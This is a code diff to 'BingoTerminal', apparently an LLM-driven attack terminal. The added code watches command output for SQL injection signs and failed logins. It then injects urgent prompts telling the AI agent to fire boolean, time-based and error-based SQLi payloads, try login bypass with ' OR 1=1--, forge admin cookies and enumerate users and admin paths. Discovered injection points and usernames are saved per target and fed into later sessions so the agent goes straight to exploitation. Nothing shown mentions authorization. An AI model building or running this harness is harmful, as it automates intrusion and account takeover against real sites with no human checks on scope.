@@ -253,6 +253,24 @@ class BingoTerminal:
         self._session_fresh: bool = True   # True = 새 세션, False = 이전 세션 복원
         # 프록시 풀 로테이션 관리자 (v3.2.18)
         self._proxy: ProxyManager = ProxyManager()
+        # ── v3.2.71 추가 ────────────────────────────────────────────────
+        # 브루트포스 연속 실패 카운터 (자동 포기 + 벡터 전환용)
+        self._bruteforce_fail_count: int = 0
+        self._bruteforce_abort_triggered: bool = False
+        # 도메인별 메모리 모듈 (target_memory)
+        try:
+            from ..core.target_memory import load as _tm_load, save as _tm_save, \
+                record_sqli_point as _tm_sqli, record_users as _tm_users, \
+                record_endpoint as _tm_ep, build_context_injection as _tm_ctx
+            self._tm_load = _tm_load
+            self._tm_save = _tm_save
+            self._tm_sqli = _tm_sqli
+            self._tm_users = _tm_users
+            self._tm_ep = _tm_ep
+            self._tm_ctx = _tm_ctx
+            self._tm_available = True
+        except Exception:
+            self._tm_available = False
 
     # ── 네트워크 환경 감지 (VPN 자동 판단) ───────────────────────
     def _detect_network_env(self) -> None:
@@ -4583,6 +4601,177 @@ class BingoTerminal:
             # 코드 실행
             results_text = self._run_code_blocks(current_response, _loaded_skills)
 
+            # ── v3.2.71-A: 응답 크기 변화 감지 → SQLi 우선 강제 ─────────────────
+            # 증상: AI가 응답 크기 차이(정상 vs 주입)를 관찰하고도 SQLi 대신 브루트포스 등 다른
+            #       벡터로 전환. 크기 차이는 매우 강력한 SQLi 인디케이터이므로 즉시 강제 전환.
+            # 탐지: 출력에 "정상=?B vs 주입=?B" 또는 "normal=Xb, injected=Yb" 같은 크기 비교가
+            #       있고, 두 값의 차이가 ≥ 100 이면 SQLi로 직행.
+            import re as _szr
+            _combined_out = "\n".join(results_text) if results_text else ""
+            _size_diff_pats = [
+                # "34853 vs 34889" / "size=34853, inject=35117" 등
+                r'(\d{4,})\s*[Bb]?\s*(?:vs|→|->|versus|normal[^\d]*)\s*(\d{4,})\s*[Bb]?',
+                r'정상[=:\s]*(\d{4,})[Bb]?.{0,30}주입[=:\s]*(\d{4,})[Bb]?',
+                r'normal[=:\s]*(\d{4,})[Bb]?.{0,50}inject[=:\s]*(\d{4,})[Bb]?',
+                r'size.*?(\d{4,})\b.{0,60}size.*?(\d{4,})\b',
+            ]
+            _sqli_size_triggered = False
+            for _szp in _size_diff_pats:
+                _szm = _szr.search(_szp, _combined_out, _szr.IGNORECASE)
+                if _szm:
+                    try:
+                        _sz_a, _sz_b = int(_szm.group(1)), int(_szm.group(2))
+                        if abs(_sz_a - _sz_b) >= 100:
+                            _sqli_size_triggered = True
+                            break
+                    except Exception:
+                        pass
+            if _sqli_size_triggered and not self._bruteforce_abort_triggered:
+                _lang = getattr(self.config, "lang", "en")
+                _size_warn = self.s.get("sqli_size_diff_detected", "")
+                if _size_warn:
+                    self.console.print(f"\n[bold green]{_size_warn}[/bold green]")
+                # 타겟 메모리에 SQLi 포인트 자동 저장 시도
+                _tgt = self._agent_state.get("target", "")
+                if _tgt and self._tm_available:
+                    try:
+                        # 출력에서 파라미터와 URL 추출 시도
+                        _url_m = _szr.search(r'https?://[^\s\'"]{10,}', _combined_out)
+                        _param_m = _szr.search(r'(?:param(?:eter)?|파라미터)[=:\s]*([a-zA-Z_][a-zA-Z0-9_]{1,30})', _combined_out, _szr.I)
+                        _found_url = _url_m.group(0) if _url_m else _tgt
+                        _found_param = _param_m.group(1) if _param_m else "unknown"
+                        # 크기 값 추출
+                        _vals = _szr.findall(r'\b(\d{4,})\b', _combined_out)
+                        _sz_n = int(_vals[0]) if len(_vals) >= 2 else None
+                        _sz_i = int(_vals[1]) if len(_vals) >= 2 else None
+                        self._tm_sqli(_tgt, _found_url, _found_param, "GET",
+                                      _sz_n, _sz_i, "boolean/size-based")
+                    except Exception:
+                        pass
+                _size_sqli_force_msg = {
+                    "ko": (
+                        "[⚡ 응답 크기 변화 → SQLi 강제 전환]\n\n"
+                        "응답 크기 차이가 100B 이상 감지되었습니다 — 이는 매우 강력한 SQL Injection 신호입니다.\n\n"
+                        "■ 즉시 다음을 수행하세요:\n"
+                        "1. 해당 파라미터에 Boolean-based blind SQLi:\n"
+                        "   정상: param=test  →  비교: param=test' AND 1=1--\n"
+                        "2. Time-based blind SQLi (MSSQL): param=test'; WAITFOR DELAY '0:0:3'--\n"
+                        "3. Error-based: param=test' AND (SELECT 1/0)--\n"
+                        "4. 브루트포스나 다른 벡터는 이 SQLi를 완전히 검증한 후에 진행하세요.\n\n"
+                        "지금 바로 SQLi 검증 코드를 작성하고 실행하세요."
+                    ),
+                    "zh": (
+                        "[⚡ 响应大小差异 → 强制切换SQLi]\n\n"
+                        "检测到响应大小差异≥100B — 这是非常强烈的SQL注入信号!\n\n"
+                        "■ 立即执行:\n"
+                        "1. Boolean-based blind SQLi: param=test' AND 1=1-- vs param=test' AND 1=2--\n"
+                        "2. Time-based (MSSQL): param=test'; WAITFOR DELAY '0:0:3'--\n"
+                        "3. Error-based: param=test' AND (SELECT 1/0)--\n"
+                        "4. 在完全验证此SQLi之前，不要切换到暴力破解或其他向量!\n\n"
+                        "现在立即编写并执行SQLi验证代码!"
+                    ),
+                    "en": (
+                        "[⚡ RESPONSE SIZE DIFF → FORCING SQLi]\n\n"
+                        "Response size difference ≥100B detected — this is a STRONG SQL injection signal.\n\n"
+                        "■ DO THIS NOW:\n"
+                        "1. Boolean-based blind SQLi: param=test' AND 1=1-- vs param=test' AND 1=2--\n"
+                        "2. Time-based (MSSQL): param=test'; WAITFOR DELAY '0:0:3'--\n"
+                        "3. Error-based: param=test' AND (SELECT 1/0)--\n"
+                        "4. Do NOT switch to brute force or other vectors before confirming this SQLi!\n\n"
+                        "Write and run SQLi confirmation code NOW."
+                    ),
+                }.get(_lang, "[⚡ SIZE DIFF → FORCE SQLi] Size difference detected. Run boolean/time-based SQLi NOW.")
+                self.history.append(Message(role="user", content=f"[SIZE-BASED SQLi SIGNAL]\n{_size_sqli_force_msg}"))
+                from ..models.registry import ModelRegistry as _MR_sz
+                _mc_sz = self.config.get_active_model_config()
+                if _mc_sz:
+                    _m_sz = _MR_sz.build(_mc_sz)
+                    _hint = self.s.get("sqli_size_force_hint", "⚡ SQLi 강제 전환 유도 중...")
+                    self.console.print(f"\n[bold green]{_hint}[/bold green]")
+                    current_response = self._stream_response(_m_sz.chat_stream(self._build_messages("")))
+                    if current_response:
+                        self.history.append(Message(role="assistant", content=current_response))
+                    continue
+
+            # ── v3.2.71-B: 브루트포스 자동 포기 + 벡터 전환 ──────────────────────
+            # 증상: AI가 로그인 브루트포스를 수십 회 반복해도 성공 못 하고 계속 시도.
+            # 탐지: 출력에 "로그인 실패 / login failed / 비밀번호 오류 / wrong password" 등
+            #       연속 실패 키워드가 일정 횟수 이상 누적.
+            # 처리: 임계값 초과 시 강제로 브루트포스 중단 + 다른 벡터로 전환 지시.
+            _BF_FAIL_KEYWORDS = [
+                r"(?:login|로그인).*?(?:fail|실패|오류|wrong|incorrect|denied|invalid)",
+                r"(?:password|비밀번호).*?(?:wrong|틀|invalid|incorrect|fail)",
+                r"(?:인증|auth).*?(?:실패|fail|error)",
+                r"로그인\s*실패",
+                r"비밀번호.*?(?:오류|틀림|불일치)",
+                r"invalid\s+(?:credentials?|password|username)",
+                r"authentication\s+fail",
+            ]
+            _bf_fail_count_cur = sum(
+                1 for pat in _BF_FAIL_KEYWORDS
+                if _szr.search(pat, _combined_out, _szr.IGNORECASE)
+            )
+            if _bf_fail_count_cur > 0:
+                self._bruteforce_fail_count += _bf_fail_count_cur
+            else:
+                # 성공 키워드 있으면 카운터 리셋
+                if _szr.search(r'(?:login|로그인).*?(?:success|성공|ok\b|200)', _combined_out, _szr.I):
+                    self._bruteforce_fail_count = 0
+            _BF_ABORT_THRESHOLD = 5  # 5회 누적 실패 → 자동 포기
+            if (self._bruteforce_fail_count >= _BF_ABORT_THRESHOLD
+                    and not self._bruteforce_abort_triggered):
+                self._bruteforce_abort_triggered = True
+                _lang = getattr(self.config, "lang", "en")
+                _bf_abort_warn = self.s.get("bruteforce_abort_warn", "")
+                if _bf_abort_warn:
+                    self.console.print(f"\n[bold yellow]{_bf_abort_warn}[/bold yellow]")
+                _bf_abort_msg = {
+                    "ko": (
+                        f"[🛑 브루트포스 자동 포기 — {self._bruteforce_fail_count}회 연속 실패]\n\n"
+                        "더 이상의 브루트포스는 효율적이지 않습니다. 즉시 중단하고 다른 공격 벡터로 전환하세요.\n\n"
+                        "■ 지금 시도해야 할 대안 공격벡터:\n"
+                        "1. SQL Injection: 로그인 폼 파라미터에 SQLi 시도 (username=' OR 1=1--)\n"
+                        "2. 사용자 열거: /join/checkId.do 등 가입 확인 API 재탐색\n"
+                        "3. SQLi 포인트 재확인: 이전에 크기 차이가 발생했던 파라미터 집중 공격\n"
+                        "4. 세션/쿠키 조작: admin 쿠키 강제 설정 후 관리자 패널 접근 시도\n"
+                        "5. 디렉토리 열거: /admin, /manager, /backend 등\n\n"
+                        "브루트포스는 완전히 포기하고 위 벡터 중 하나를 지금 즉시 시도하세요."
+                    ),
+                    "zh": (
+                        f"[🛑 暴力破解自动放弃 — 已连续失败{self._bruteforce_fail_count}次]\n\n"
+                        "继续暴力破解效率极低，立即停止并切换到其他攻击向量!\n\n"
+                        "■ 现在尝试以下替代攻击向量:\n"
+                        "1. SQL注入: 在登录表单参数尝试SQLi (username=' OR 1=1--)\n"
+                        "2. 用户枚举: 重新探测注册/检查API\n"
+                        "3. 重新攻击SQLi点: 集中攻击之前发现响应大小差异的参数\n"
+                        "4. Session/Cookie操作: 强制设置admin cookie后访问管理面板\n"
+                        "5. 目录枚举: /admin, /manager, /backend等\n\n"
+                        "完全放弃暴力破解，立即尝试上述向量之一!"
+                    ),
+                    "en": (
+                        f"[🛑 BRUTEFORCE AUTO-ABORT — {self._bruteforce_fail_count} consecutive failures]\n\n"
+                        "Brute force is no longer efficient. STOP immediately and switch vectors.\n\n"
+                        "■ Try these alternative attack vectors NOW:\n"
+                        "1. SQL Injection on login form: username=' OR 1=1--\n"
+                        "2. User enumeration: re-probe registration/check APIs\n"
+                        "3. Re-attack SQLi points: focus on params with size differences\n"
+                        "4. Session/Cookie manipulation: force admin cookie, access admin panel\n"
+                        "5. Directory enumeration: /admin, /manager, /backend\n\n"
+                        "ABANDON brute force completely. Pick one vector above and execute NOW."
+                    ),
+                }.get(_lang, "[🛑 BRUTEFORCE ABORTED] Switch to SQLi or other vectors now.")
+                self.history.append(Message(role="user", content=f"[BRUTEFORCE ABORT]\n{_bf_abort_msg}"))
+                from ..models.registry import ModelRegistry as _MR_bf
+                _mc_bf = self.config.get_active_model_config()
+                if _mc_bf:
+                    _m_bf = _MR_bf.build(_mc_bf)
+                    _bf_hint = self.s.get("bruteforce_redirect_hint", "🛑 브루트포스 중단 → 대안 벡터 전환 중...")
+                    self.console.print(f"\n[bold yellow]{_bf_hint}[/bold yellow]")
+                    current_response = self._stream_response(_m_bf.chat_stream(self._build_messages("")))
+                    if current_response:
+                        self.history.append(Message(role="assistant", content=current_response))
+                    continue
+
             # ── SQLi 페이로드 에코 감지 (v3.2.70) ────────────────────────────
             # 증상: AI가 생성한 스크립트가 HTTP 응답에서 실제 데이터를 파싱하지 않고
             #       SQL 페이로드 문자열 자체를 "추출 결과"로 출력 → hex 커서 폭발로 이어짐.
@@ -4840,6 +5029,38 @@ class BingoTerminal:
             self._exec_loop_count += 1
             # 루프마다 세션 자동 저장 (이어하기용)
             self._save_history()
+            # ── v3.2.71: target memory 자동 업데이트 ──────────────────────────
+            # 실행 결과에서 SQLi 포인트, 유저, 엔드포인트를 자동 추출해 저장.
+            # 다음 세션 시작 시 _offer_resume 에서 이 데이터를 AI에 주입.
+            if self._tm_available:
+                try:
+                    import re as _tm_re
+                    _tgt_key = self._agent_state.get("target", "")
+                    _raw_scan = raw_results
+                    if _tgt_key and _raw_scan:
+                        # SQLi 확인 키워드 → sqli_point 저장
+                        _sqli_confirmed = bool(_tm_re.search(
+                            r'(?:sql.?inject|sqli|1=1.*200|WAITFOR.*DELAY|시간.*지연|응답.*차이|size.diff)',
+                            _raw_scan, _tm_re.I
+                        ))
+                        if _sqli_confirmed:
+                            _u = _tm_re.search(r'https?://[^\s\'",]{10,}', _raw_scan)
+                            _p = _tm_re.search(r'(?:param(?:eter)?|파라미터)[=:\s]*([a-zA-Z_][a-zA-Z0-9_]{1,30})', _raw_scan, _tm_re.I)
+                            self._tm_sqli(
+                                _tgt_key,
+                                _u.group(0) if _u else _tgt_key,
+                                _p.group(1) if _p else "unknown",
+                                "GET", None, None, "confirmed"
+                            )
+                        # 유저 확인 키워드 → users 저장
+                        _user_m = _tm_re.findall(
+                            r'(?:user(?:name|id)?|아이디|계정)[=:\s]*[\"\']?([a-zA-Z0-9_\-]{3,20})[\"\']?.*?(?:exist|exists|found|확인|존재)',
+                            _raw_scan, _tm_re.I
+                        )
+                        if _user_m:
+                            self._tm_users(_tgt_key, list(set(_user_m)))
+                except Exception:
+                    pass
 
             # ── IP 차단 / Rate Limit 자동 감지 및 대기 ────────────────────
             # ⚠️  v3.2.4: 오탐 방지 강화
@@ -6045,6 +6266,31 @@ class BingoTerminal:
                 "en": "🗑️ Previous session state cleared (credentials/tables/DB reset)",
             }.get(_lang, "🗑️ Previous session state cleared")
             self.console.print(f"[{THEME['dim']}]{_cleared}[/]\n")
+            # ── v3.2.71: 타겟 메모리 주입 ─────────────────────────────────────
+            # 새 세션 시작 시에도 이전 탐색에서 발견한 SQLi 포인트·유저 등을 불러와 주입.
+            # AI가 처음부터 알고 있어서 중복 탐색 없이 바로 취약점으로 직행 가능.
+            if self._tm_available and target:
+                try:
+                    _ctx = self._tm_ctx(target, _lang)
+                    if _ctx:
+                        self.history.append(Message(
+                            role="user",
+                            content=(
+                                "[🧠 TARGET MEMORY — CRITICAL PRIORITY]\n"
+                                + _ctx
+                                + "\n\n[INSTRUCTION] Start with the SQLi points listed above. "
+                                "Do NOT waste time re-scanning login forms or doing brute force. "
+                                "Go straight to blind/error-based SQLi on the confirmed parameters."
+                            )
+                        ))
+                        _mem_label = {
+                            "ko": f"🧠 타겟 메모리 로드됨 — 이전 탐색 결과를 AI에 주입",
+                            "zh": f"🧠 已加载目标记忆 — 将上次发现注入AI上下文",
+                            "en": f"🧠 Target memory loaded — injecting previous findings into AI",
+                        }.get(_lang, "🧠 Target memory loaded")
+                        self.console.print(f"[bold green]{_mem_label}[/bold green]\n")
+                except Exception:
+                    pass
             return False
 
     def _load_agent_state(self) -> dict:
